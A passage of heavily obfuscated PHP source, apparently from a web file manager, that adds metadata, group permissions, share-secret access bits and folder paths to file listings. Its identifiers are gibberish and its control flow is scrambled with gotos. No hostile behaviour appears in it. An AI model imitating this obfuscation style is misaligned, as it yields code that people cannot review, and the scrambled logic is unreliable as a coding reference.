EŠ¸éîŸêî: foreach ($Fô–Ó¡ÎÈ• as $CÊÃ°ğ•¾ƒ) { if (!isset($fÜ¥ª‘¤±[$CÊÃ°ğ•¾ƒ[$eÚĞÂ…ÌÔ[397]]])) { $fÜ¥ª‘¤±[$CÊÃ°ğ•¾ƒ[$eÚĞÂ…ÌÔ[397]]] = array(); } if (in_array($CÊÃ°ğ•¾ƒ[$eÚĞÂ…ÌÔ[93]], $C¦ÌâÈ«)) { continue; } $fÜ¥ª‘¤±[$CÊÃ°ğ•¾ƒ[$eÚĞÂ…ÌÔ[397]]][$CÊÃ°ğ•¾ƒ[$eÚĞÂ…ÌÔ[93]]] = $CÊÃ°ğ•¾ƒ[$eÚĞÂ…ÌÔ[372]]; } foreach ($B²ùÍğ˜ß‡ as &$AËø““¬ËÈ) { $AËø““¬ËÈ[$eÚĞÂ…ÌÔ[459]] = !1; if (isset($fÜ¥ª‘¤±[$AËø““¬ËÈ[$eÚĞÂ…ÌÔ[397]]])) { $AËø““¬ËÈ[$eÚĞÂ…ÌÔ[459]] = $fÜ¥ª‘¤±[$AËø““¬ËÈ[$eÚĞÂ…ÌÔ[397]]]; } if ($this->fileIsLock($AËø““¬ËÈ) && $AËø““¬ËÈ[$eÚĞÂ…ÌÔ[408]]) { $BõãÜ³†©ß = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $AËø““¬ËÈ[$eÚĞÂ…ÌÔ[408]][$eÚĞÂ…ÌÔ[409]] = AuthModel::authDisable($AËø““¬ËÈ[$eÚĞÂ…ÌÔ[408]][$eÚĞÂ…ÌÔ[409]], $BõãÜ³†©ß); $AËø““¬ËÈ[$eÚĞÂ…ÌÔ[408]][$eÚĞÂ…ÌÔ[460]][$eÚĞÂ…ÌÔ[408]] = $AËø““¬ËÈ[$eÚĞÂ…ÌÔ[408]][$eÚĞÂ…ÌÔ[409]]; } } unset($AËø““¬ËÈ); goto eĞÅº×åâ•; eĞÅº×åâ•: } protected function _listAppendFileMeta(&$c¡…›øŒŒ, $cÛº¡ÇŞ…¬) { goto A«ÛŞŠˆ‚©; Aì¡ËŒË‡•: $aëß§ô†Ë = $aëß§ô†Ë ? $aëß§ô†Ë : array(); $CøÄ–¥ä¢© = array(); foreach ($aëß§ô†Ë as $D¢ŠôÂ—Ï¯) { if (!isset($CøÄ–¥ä¢©[$D¢ŠôÂ—Ï¯[$e†…ğ²Œ[461]]])) { $CøÄ–¥ä¢©[$D¢ŠôÂ—Ï¯[$e†…ğ²Œ[461]]] = array(); } $CøÄ–¥ä¢©[$D¢ŠôÂ—Ï¯[$e†…ğ²Œ[461]]][$D¢ŠôÂ—Ï¯[$e†…ğ²Œ[93]]] = $D¢ŠôÂ—Ï¯[$e†…ğ²Œ[372]]; } goto a¨àÍÜ‘Ú¬; a¨àÍÜ‘Ú¬: foreach ($c¡…›øŒŒ as &$c½èà®–) { goto f¶¾Õ¶‚; b¼–¡¬·: $BôÕâÛ»­[$e†…ğ²Œ[78]] = $c½èà®–[$e†…ğ²Œ[78]]; $BôÕâÛ»­[$e†…ğ²Œ[28]] = $c½èà®–[$e†…ğ²Œ[28]]; if (!isset(self::$cacheFileInfo[$e†…ğ²Œ[467] . $dÑÂºÜÂ–¡])) { self::$cacheFileInfo[$e†…ğ²Œ[467] . $dÑÂºÜÂ–¡] = array_merge(array(), $BôÕâÛ»­); } goto D¸ÅÚ‹ì†Ÿ; f¶¾Õ¶‚: $dÑÂºÜÂ–¡ = $c½èà®–[$e†…ğ²Œ[461]]; if (!$dÑÂºÜÂ–¡ || !is_array($AÇŞìŞÃõ[$dÑÂºÜÂ–¡])) { continue; } $BôÕâÛ»­ = $AÇŞìŞÃõ[$dÑÂºÜÂ–¡]; goto b¼–¡¬·; a¿®Ñ¢ôá: if (isset($c½èà®–[$e†…ğ²Œ[164]][$e†…ğ²Œ[163]])) { $c½èà®–[$e†…ğ²Œ[163]] = json_decode($c½èà®–[$e†…ğ²Œ[164]][$e†…ğ²Œ[163]], !0); unset($c½èà®–[$e†…ğ²Œ[164]][$e†…ğ²Œ[163]]); } goto Dµ˜ÎáœÄ»; D¸ÅÚ‹ì†Ÿ: unset($AÇŞìŞÃõ[$dÑÂºÜÂ–¡][$e†…ğ²Œ[76]]); $c¢ñëğÕŞä = is_array($CøÄ–¥ä¢©[$dÑÂºÜÂ–¡]) ? $CøÄ–¥ä¢©[$dÑÂºÜÂ–¡] : array(); $c½èà®–[$e†…ğ²Œ[164]] = array_merge($c¢ñëğÕŞä, $AÇŞìŞÃõ[$dÑÂºÜÂ–¡]); goto a¿®Ñ¢ôá; Dµ˜ÎáœÄ»: } unset($c½èà®–); goto e´ƒÃœ‡; CÑÖÅ‘Š : if (!$fÈ‚¨­ğ») { return; } $dˆÑµ¯¶¨ = array($e†…ğ²Œ[462] => array($e†…ğ²Œ[413], $fÈ‚¨­ğ»)); $F·‘Ÿ„¯ùô = $e†…ğ²Œ[463]; goto C†´ÄùíÖ; A«ÛŞŠˆ‚©: $e†…ğ²Œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÈ‚¨­ğ» = array_to_keyvalue($c¡…›øŒŒ, $e†…ğ²Œ[33], $e†…ğ²Œ[461]); $fÈ‚¨­ğ» = array_filter(array_unique($fÈ‚¨­ğ»)); goto CÑÖÅ‘Š ; C†´ÄùíÖ: $AÇŞìŞÃõ = Model($e†…ğ²Œ[464])->field($F·‘Ÿ„¯ùô)->where($dˆÑµ¯¶¨)->select(); $AÇŞìŞÃõ = array_to_keyvalue($AÇŞìŞÃõ, $e†…ğ²Œ[461]); $aëß§ô†Ë = Model($e†…ğ²Œ[465])->field($e†…ğ²Œ[466])->where($dˆÑµ¯¶¨)->select(); goto Aì¡ËŒË‡•; e´ƒÃœ‡: } protected function _listAppendSourceInfo(&$d°Í±©ÌßÊ, $dí£îìš) { goto CÃâ¿·¦ÃÛ; f±ÒœíòÅ”: $fÙÈ§¶ä = array_to_keyvalue_group($EÅ½ô»áš©, $f²Šñ„®Ú¯[397]); foreach ($d°Í±©ÌßÊ as &$FÖÌ×¶‡áè) { $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]] = array($f²Šñ„®Ú¯[471] => 0, $f²Šñ„®Ú¯[472] => 0, $f²Šñ„®Ú¯[473] => 0); if (isset($aĞÅãœØ×[$FÖÌ×¶‡áè[$f²Šñ„®Ú¯[397]]])) { $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]][$f²Šñ„®Ú¯[474]] = 1; $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]][$f²Šñ„®Ú¯[475]] = $aĞÅãœØ×[$FÖÌ×¶‡áè[$f²Šñ„®Ú¯[397]]][$f²Šñ„®Ú¯[28]]; } if (isset($d ã˜¶ÜŠ×[$FÖÌ×¶‡áè[$f²Šñ„®Ú¯[397]]])) { $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]][$f²Šñ„®Ú¯[476]] = array(); foreach ($d ã˜¶ÜŠ×[$FÖÌ×¶‡áè[$f²Šñ„®Ú¯[397]]] as $Däš¿ğ˜™) { $d·µŒ¢õİä = $B«‹øŞœÈ[$Däš¿ğ˜™]; $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]][$f²Šñ„®Ú¯[476]][] = array($f²Šñ„®Ú¯[477] => $d·µŒ¢õİä[$f²Šñ„®Ú¯[395]], $f²Šñ„®Ú¯[415] => $d·µŒ¢õİä[$f²Šñ„®Ú¯[28]], $f²Šñ„®Ú¯[478] => $d·µŒ¢õİä[$f²Šñ„®Ú¯[479]]); } } if (isset($fÙÈ§¶ä[$FÖÌ×¶‡áè[$f²Šñ„®Ú¯[397]]])) { $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]][$f²Šñ„®Ú¯[480]] = array(); foreach ($fÙÈ§¶ä[$FÖÌ×¶‡áè[$f²Šñ„®Ú¯[397]]] as $cäÇÆ¢Îö) { $FÖÌ×¶‡áè[$f²Šñ„®Ú¯[85]][$f²Šñ„®Ú¯[480]] = array($f²Šñ„®Ú¯[481] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[482]], $f²Šñ„®Ú¯[483] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[484]], $f²Šñ„®Ú¯[485] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[397]], $f²Šñ„®Ú¯[486] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[487]], $f²Šñ„®Ú¯[488] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[489]], $f²Šñ„®Ú¯[490] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[490]], $f²Šñ„®Ú¯[491] => $cäÇÆ¢Îö[$f²Šñ„®Ú¯[491]]); } } } unset($FÖÌ×¶‡áè); goto Dë‰‚ìîµô; C«İºô‹ç: $e°Ö÷Ò‚Ù¥ = Model($f²Šñ„®Ú¯[420])->listData(); $e©ÖÏ…®ˆ = Model($f²Šñ„®Ú¯[410])->listData(); $EÅ½ô»áš© = Model($f²Šñ„®Ú¯[470])->listSimple(); goto d‰ŞÑŠØ‘õ; Dë‰‚ìîµô: return $d°Í±©ÌßÊ; goto Aˆ†ŠŠê‹; d‰ŞÑŠØ‘õ: $B«‹øŞœÈ = array_to_keyvalue($d×©ËòÊâÂ, $f²Šñ„®Ú¯[395]); $d ã˜¶ÜŠ× = array_to_keyvalue_group($e°Ö÷Ò‚Ù¥, $f²Šñ„®Ú¯[76], $f²Šñ„®Ú¯[421]); $aĞÅãœØ× = array_to_keyvalue($e©ÖÏ…®ˆ, $f²Šñ„®Ú¯[76]); goto f±ÒœíòÅ”; CÃâ¿·¦ÃÛ: $f²Šñ„®Ú¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!defined($f²Šñ„®Ú¯[468])) { return; } $d×©ËòÊâÂ = Model($f²Šñ„®Ú¯[469])->listData(); goto C«İºô‹ç; Aˆ†ŠŠê‹: } protected function _listAppendChildren(&$AÚïË ±Ï, $aøëø™öèÑ) { goto fäÕé×òÌ; bĞ·ª¿ñ¼: unset($fš×â¢ÏøÓ); goto D…¿²÷¡É·; fäÕé×òÌ: $e´—‘´²ÕÂ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b„ÉÔÂ±Ó = array(); $FİŒÙÔÂÂó = array($e´—‘´²ÕÂ[203] => 0, $e´—‘´²ÕÂ[204] => 0); goto c“É˜¶Óà´; CâÈáÜò¾¹: $aâÆ…ù‰ = array($e´—‘´²ÕÂ[492] => array($e´—‘´²ÕÂ[7], $b„ÉÔÂ±Ó)); $fÜÏµàöï‚ = array($e´—‘´²ÕÂ[492], $e´—‘´²ÕÂ[405], $e´—‘´²ÕÂ[493] => $e´—‘´²ÕÂ[494]); $Cö„×˜·åŞ = $this->field($fÜÏµàöï‚)->where($aâÆ…ù‰)->group($e´—‘´²ÕÂ[495])->select(); goto E¢«ÛÎ‰; E¢«ÛÎ‰: $cäĞİÈøÛí = array(); foreach ($Cö„×˜·åŞ as $e¼¡Š¬Ì³) { $D‡ÃÉ„Òù« = $e¼¡Š¬Ì³[$e´—‘´²ÕÂ[492]]; $EÇøøÒ¶²œ = $e¼¡Š¬Ì³[$e´—‘´²ÕÂ[405]] == $e´—‘´²ÕÂ[87] ? $e´—‘´²ÕÂ[204] : $e´—‘´²ÕÂ[203]; if (!isset($cäĞİÈøÛí[$D‡ÃÉ„Òù«])) { $cäĞİÈøÛí[$D‡ÃÉ„Òù«] = array($e´—‘´²ÕÂ[203] => 0, $e´—‘´²ÕÂ[204] => 0); } $cäĞİÈøÛí[$D‡ÃÉ„Òù«][$EÇøøÒ¶²œ] += $e¼¡Š¬Ì³[$e´—‘´²ÕÂ[494]]; } foreach ($AÚïË ±Ï as &$fš×â¢ÏøÓ) { if (!$fš×â¢ÏøÓ[$e´—‘´²ÕÂ[405]]) { continue; } $fï¼”Üò‚¬ = is_array($cäĞİÈøÛí[$fš×â¢ÏøÓ[$e´—‘´²ÕÂ[397]]]) ? $cäĞİÈøÛí[$fš×â¢ÏøÓ[$e´—‘´²ÕÂ[397]]] : $FİŒÙÔÂÂó; $fš×â¢ÏøÓ[$e´—‘´²ÕÂ[204]] = $fï¼”Üò‚¬[$e´—‘´²ÕÂ[204]]; $fš×â¢ÏøÓ[$e´—‘´²ÕÂ[203]] = $fï¼”Üò‚¬[$e´—‘´²ÕÂ[203]]; unset($fš×â¢ÏøÓ[$e´—‘´²ÕÂ[407]]); } goto bĞ·ª¿ñ¼; c“É˜¶Óà´: foreach ($AÚïË ±Ï as &$fš×â¢ÏøÓ) { if (!$fš×â¢ÏøÓ[$e´—‘´²ÕÂ[405]]) { continue; } $b„ÉÔÂ±Ó[] = $fš×â¢ÏøÓ[$e´—‘´²ÕÂ[397]]; } unset($fš×â¢ÏøÓ); if (!$b„ÉÔÂ±Ó) { return; } goto CâÈáÜò¾¹; D…¿²÷¡É·: } protected function _listAppendAuth(&$aÄ‡§”˜¸›) { goto c·ª¡–ïê; câğ¸ù‘ó‘: $F‚†ÈŞóÃÍ = Model($Aç¦îì¶ïµ[496])->getSourceList($DİÁ‰‚„¢Ú, $CÙ¹×ó»éˆ); foreach ($aÄ‡§”˜¸› as $cİ…§²®Ì© => &$d†ƒÕç‘™›) { $d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]] = $F‚†ÈŞóÃÍ[$d†ƒÕç‘™›[$Aç¦îì¶ïµ[397]]]; if (!$d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]] && $d†ƒÕç‘™›[$Aç¦îì¶ïµ[406]] == self::TYPE_GROUP) { $d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]] = Action($Aç¦îì¶ïµ[497])->pathGroupAuthMake($d†ƒÕç‘™›[$Aç¦îì¶ïµ[498]]); if (!$d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]] && !_get($GLOBALS, $Aç¦îì¶ïµ[499])) { $d†ƒÕç‘™›[$Aç¦îì¶ïµ[196]] = !1; $d†ƒÕç‘™›[$Aç¦îì¶ïµ[195]] = !1; } } if ($d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]]) { $d†ƒÕç‘™›[$Aç¦îì¶ïµ[196]] = AuthModel::authCheckEdit($d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]][$Aç¦îì¶ïµ[409]]); $d†ƒÕç‘™›[$Aç¦îì¶ïµ[195]] = AuthModel::authCheckView($d†ƒÕç‘™›[$Aç¦îì¶ïµ[408]][$Aç¦îì¶ïµ[409]]); } $this->groupPathDisplay($d†ƒÕç‘™›); } unset($d†ƒÕç‘™›); goto AÇ¹¶ª÷£Ò; C¶”Ãš¶Ø: foreach ($aÄ‡§”˜¸› as $d†ƒÕç‘™›) { if ($d†ƒÕç‘™›[$Aç¦îì¶ïµ[406]] == self::TYPE_GROUP) { $DİÁ‰‚„¢Ú[] = $d†ƒÕç‘™›[$Aç¦îì¶ïµ[397]]; } } if (!$DİÁ‰‚„¢Ú) { return; } $CÙ¹×ó»éˆ = array_to_keyvalue($aÄ‡§”˜¸›, $Aç¦îì¶ïµ[397]); goto câğ¸ù‘ó‘; c·ª¡–ïê: $Aç¦îì¶ïµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!defined($Aç¦îì¶ïµ[468])) { return; } $DİÁ‰‚„¢Ú = array(); goto C¶”Ãš¶Ø; AÇ¹¶ª÷£Ò: } public function _listAppendAuthSecret(&$bÄêÈ†´éË) { goto Cô™Á¾‡¨Ë; Cô™Á¾‡¨Ë: $EŒÕ–Ø§ƒˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (Model($EŒÕ–Ø§ƒˆ[427])->get($EŒÕ–Ø§ƒˆ[500]) != $EŒÕ–Ø§ƒˆ[87]) { return; } static $cíÇøÀ« = false; goto d…ªÛ…ñ´ø; AóÒÍÉõŒÅ: $c¶Û©Öğ»Ë = $this->_listAppendPath($BÏ®”»¯¼¾, !0); foreach ($bÄêÈ†´éË as $dª•›í¯Ø® => &$aø‡å÷é´Ê) { if (!is_array($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]])) { continue; } if ($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[406]] != $EŒÕ–Ø§ƒˆ[509]) { continue; } if (isset($cíÇøÀ«[$aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[397]]])) { goto aÙï¼ƒº³Õ; dŠêÂééƒÆ: if ($bÜÉÇ¢ÈŒß[$EŒÕ–Ø§ƒˆ[446]] != $CÅãˆœƒè) { $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[409]] = $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[409]] & $bÜÉÇ¢ÈŒß[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[408]]; } continue; goto B°™Îéğ²Ú; aÙï¼ƒº³Õ: $bÜÉÇ¢ÈŒß = $cíÇøÀ«[$aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[397]]]; if (!is_array($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[459]])) { $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[459]] = array(); } $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[459]][$EŒÕ–Ø§ƒˆ[510]] = $bÜÉÇ¢ÈŒß[$EŒÕ–Ø§ƒˆ[504]]; goto FÁƒ°®·À; FÁƒ°®·À: $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[511]] = $bÜÉÇ¢ÈŒß; $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[512]] = $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[513]]; $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[514]] = $EŒÕ–Ø§ƒˆ[87]; goto dŠêÂééƒÆ; B°™Îéğ²Ú: } $b“©Ó¤æÍ¯ = $this->parentLevelArray($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[515]]); $cÊŒ ·“”Â = array_reverse($b“©Ó¤æÍ¯); foreach ($cÊŒ ·“”Â as $CÅø·•†¸ => $fõá¦ÂÚ‡Ö) { goto A½§¡©ñŠµ; b›£éÇÜÖ: for ($a¦–éäµ’÷ = 0; $a¦–éäµ’÷ < $Bßõ×šôâ; $a¦–éäµ’÷++) { if (!isset($c¶Û©Öğ»Ë[$b“©Ó¤æÍ¯[$a¦–éäµ’÷]])) { $FÇó†“››Å = $EŒÕ–Ø§ƒˆ[33]; break; } $FÇó†“››Å = $FÇó†“››Å . rtrim($c¶Û©Öğ»Ë[$b“©Ó¤æÍ¯[$a¦–éäµ’÷]], $EŒÕ–Ø§ƒˆ[8]) . $EŒÕ–Ø§ƒˆ[8]; } $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[512]] = rtrim($FÇó†“››Å, $EŒÕ–Ø§ƒˆ[8]) . $EŒÕ–Ø§ƒˆ[8]; break; goto Dµ˜ŞœÃõ•; A½§¡©ñŠµ: if (!isset($cíÇøÀ«[$fõá¦ÂÚ‡Ö])) { continue; } $bÜÉÇ¢ÈŒß = $cíÇøÀ«[$fõá¦ÂÚ‡Ö]; $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[511]] = $bÜÉÇ¢ÈŒß; goto fŸË¥¤ì¶; fŸË¥¤ì¶: if ($bÜÉÇ¢ÈŒß[$EŒÕ–Ø§ƒˆ[446]] != $CÅãˆœƒè) { $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[409]] = $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[409]] & $bÜÉÇ¢ÈŒß[$EŒÕ–Ø§ƒˆ[408]][$EŒÕ–Ø§ƒˆ[408]]; } $FÇó†“››Å = $EŒÕ–Ø§ƒˆ[33]; $Bßõ×šôâ = count($b“©Ó¤æÍ¯) - $CÅø·•†¸; goto b›£éÇÜÖ; Dµ˜ŞœÃõ•: } } unset($aø‡å÷é´Ê); goto C£Ğô£ŠğÁ; d…ªÛ…ñ´ø: if (!$cíÇøÀ«) { goto f¸ê½ŒöÏ; f¸ê½ŒöÏ: $c´Ø±‘…¬¿ = Model($EŒÕ–Ø§ƒˆ[501]); $C§éğµŠà² = Model($EŒÕ–Ø§ƒˆ[502]); $cíÇøÀ« = $C§éğµŠà²->listData(); goto A ğšŠ»; A ğšŠ»: $cíÇøÀ« = array_to_keyvalue($cíÇøÀ«, $EŒÕ–Ø§ƒˆ[397]); $bôÖå¾òë÷ = json_decode(Model($EŒÕ–Ø§ƒˆ[427])->get($EŒÕ–Ø§ƒˆ[503]), !0); $bôÖå¾òë÷ = array_to_keyvalue($bôÖå¾òë÷, $EŒÕ–Ø§ƒˆ[395]); goto eˆòÓ£ĞÂ; eˆòÓ£ĞÂ: foreach ($cíÇøÀ« as $dª•›í¯Ø® => $aø‡å÷é´Ê) { goto A¬ÀÏãÎ™ç; có²Ä³ÚöÏ: $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[506]] = Model($EŒÕ–Ø§ƒˆ[507])->getInfoSimpleOuter($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[446]]); $cíÇøÀ«[$dª•›í¯Ø®] = $aø‡å÷é´Ê; goto CïµªÃ½öš; A¬ÀÏãÎ™ç: $fÆ«Ì†¶—¥ = $bôÖå¾òë÷[$aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[504]]]; if (!$fÆ«Ì†¶—¥) { $C§éğµŠà²->remove($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[395]]); unset($cíÇøÀ«[$dª•›í¯Ø®]); continue; } $B‚Ï‡ÏŸ” = $c´Ø±‘…¬¿->listData($fÆ«Ì†¶—¥[$EŒÕ–Ø§ƒˆ[408]]); goto cà®Ò…¡ãÓ; cà®Ò…¡ãÓ: if (!$B‚Ï‡ÏŸ”) { $C§éğµŠà²->remove($aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[395]]); unset($cíÇøÀ«[$dª•›í¯Ø®]); continue; } $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[408]] = $B‚Ï‡ÏŸ”; $aø‡å÷é´Ê[$EŒÕ–Ø§ƒˆ[505]] = $fÆ«Ì†¶—¥; goto có²Ä³ÚöÏ; CïµªÃ½öš: } goto BÇõº³¤ñé; BÇõº³¤ñé: } $CÅãˆœƒè = defined($EŒÕ–Ø§ƒˆ[508]) ? USER_ID : $EŒÕ–Ø§ƒˆ[33]; $BÏ®”»¯¼¾ = array(); goto AóÒÍÉõŒÅ; C£Ğô£ŠğÁ: } public function groupPathDisplay(&$a˜‘¼‹Â†š) { goto F´½²£Êà; FÀ¾«±ìóè: $a˜‘¼‹Â†š[$Fë‰½ñŒ‚[517]] = $B´ç‰Ñ¦Ïï[$Fë‰½ñŒ‚[492]]; $a˜‘¼‹Â†š[$Fë‰½ñŒ‚[518]] = $B´ç‰Ñ¦Ïï[$Fë‰½ñŒ‚[515]]; $a˜‘¼‹Â†š[$Fë‰½ñŒ‚[519]] = $B´ç‰Ñ¦Ïï[$Fë‰½ñŒ‚[520]]; goto B½ã‚¯Åç; EÚ¿«†­¨İ: $Bƒ™¾÷×©Š = $this->parentLevelArray($B´ç‰Ñ¦Ïï[$Fë‰½ñŒ‚[515]]); $B±Ç§Ê¹®¶ = $Fë‰½ñŒ‚[33]; foreach ($Bƒ™¾÷×©Š as $aé‹¢ôÙ®´) { $aœ‹„—Ó = Model($Fë‰½ñŒ‚[516])->getInfo($aé‹¢ôÙ®´); $B±Ç§Ê¹®¶ .= $aœ‹„—Ó[$Fë‰½ñŒ‚[85]][$Fë‰½ñŒ‚[397]] . $Fë‰½ñŒ‚[47]; } goto FÀ¾«±ìóè; F´½²£Êà: $Fë‰½ñŒ‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($a˜‘¼‹Â†š[$Fë‰½ñŒ‚[406]] != self::TYPE_GROUP) { return; } $B´ç‰Ñ¦Ïï = Model($Fë‰½ñŒ‚[516])->getInfo($a˜‘¼‹Â†š[$Fë‰½ñŒ‚[498]]); goto EÚ¿«†­¨İ; B½ã‚¯Åç: $a˜‘¼‹Â†š[$Fë‰½ñŒ‚[521]] = $B±Ç§Ê¹®¶ . $B´ç‰Ñ¦Ïï[$Fë‰½ñŒ‚[85]][$Fë‰½ñŒ‚[397]]; goto AÙ‘¿ô±ª; AÙ‘¿ô±ª: } protected function _listAppendPath(&$CæŠéÛë¿ˆ, $c‹±´¦Ïìò = false) { goto b¨Å»Øï¿½; C•«¹è: $cÜªªŠÅäÂ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $FÊÙ„è’ƒØ = array(); foreach ($CæŠéÛë¿ˆ as &$eˆ§ô’ˆ£Ì) { goto Fç„ê¶ÊäŠ; dƒ‹ÍÙïáÑ: $e»›¹ªÄ±› .= $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[28]]; if ($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[405]] == $cé‘¢¢Ù“‘[87]) { $e»›¹ªÄ±› .= $cé‘¢¢Ù“‘[8]; } $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[513]] = str_replace($cé‘¢¢Ù“‘[523], $cé‘¢¢Ù“‘[8], $e»›¹ªÄ±›); goto dùÍªñŠ‹; Fç„ê¶ÊäŠ: $eèà™¬Ô±† = $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[515]]; $e»›¹ªÄ±› = $cé‘¢¢Ù“‘[33]; if (isset($FÊÙ„è’ƒØ[$eèà™¬Ô±†])) { $e»›¹ªÄ±› = $FÊÙ„è’ƒØ[$eèà™¬Ô±†]; } else { $cŠõîÖãĞ = $this->parentLevelArray($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[515]]); foreach ($cŠõîÖãĞ as $d¬ŒÉËµ«ó => $b‚ÚŞØİ½†) { if (isset($aš¬Ïä†ÓÍ[$b‚ÚŞØİ½†])) { $e»›¹ªÄ±› .= $aš¬Ïä†ÓÍ[$b‚ÚŞØİ½†] . $cé‘¢¢Ù“‘[8]; } } $FÊÙ„è’ƒØ[$eèà™¬Ô±†] = $e»›¹ªÄ±›; } goto dƒ‹ÍÙïáÑ; dùÍªñŠ‹: if ($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[492]] == $cé‘¢¢Ù“‘[191]) { $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[28]] = trim($aš¬Ïä†ÓÍ[$eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[397]]], $cé‘¢¢Ù“‘[8]); $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[513]] = $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[28]] . $cé‘¢¢Ù“‘[8]; } if (intval($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($eˆ§ô’ˆ£Ì, $cŠõîÖãĞ, $cÜªªŠÅäÂ); } goto cÓ»È´Œª§; cÓ»È´Œª§: } goto FŞßîğ­«…; Bï´’ÁŸÇ: unset($eˆ§ô’ˆ£Ì); $eˆíææ¼¡ = array_unique($eˆíææ¼¡); if (count($eˆíææ¼¡) > 0) { $F‘Ú²àî¶‚ = array($cé‘¢¢Ù“‘[412] => array($cé‘¢¢Ù“‘[413], $eˆíææ¼¡)); if (count($eˆíææ¼¡) == 1) { $eÛ‰¹æ×¦Ë = $this->sourceInfo($eˆíææ¼¡[0]); $fÂô‡ÒÓÌõ = is_array($eÛ‰¹æ×¦Ë) ? array($eÛ‰¹æ×¦Ë) : !1; } else { $fÂô‡ÒÓÌõ = $this->field($cé‘¢¢Ù“‘[522])->where($F‘Ú²àî¶‚)->select(); } if (!$fÂô‡ÒÓÌõ) { $fÂô‡ÒÓÌõ = array(); } foreach ($fÂô‡ÒÓÌõ as $dœ±‰¯¡ŞŞ) { $aš¬Ïä†ÓÍ[$dœ±‰¯¡ŞŞ[$cé‘¢¢Ù“‘[397]]] = $dœ±‰¯¡ŞŞ[$cé‘¢¢Ù“‘[28]]; } } goto C•«¹è; eÂÎ™ò©¢ƒ: $cŞĞÜèß = array(); if ($c‹±´¦Ïìò) { return $aš¬Ïä†ÓÍ; } foreach ($CæŠéÛë¿ˆ as &$eˆ§ô’ˆ£Ì) { goto cİ ²¹©’; aÃöÌ¸ñ: if (isset($cŞĞÜèß[$eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[515]]])) { continue; } $cŞĞÜèß[$eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[515]]] = !0; $cŠõîÖãĞ = $this->parentLevelArray($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[515]]); goto c…åÌ¦èÚ; cİ ²¹©’: $b£Ëå²ì = $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[397]]; if ($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[405]] == $cé‘¢¢Ù“‘[87] && $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[492]] != 0) { $aš¬Ïä†ÓÍ[$b£Ëå²ì] = $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[28]]; } if 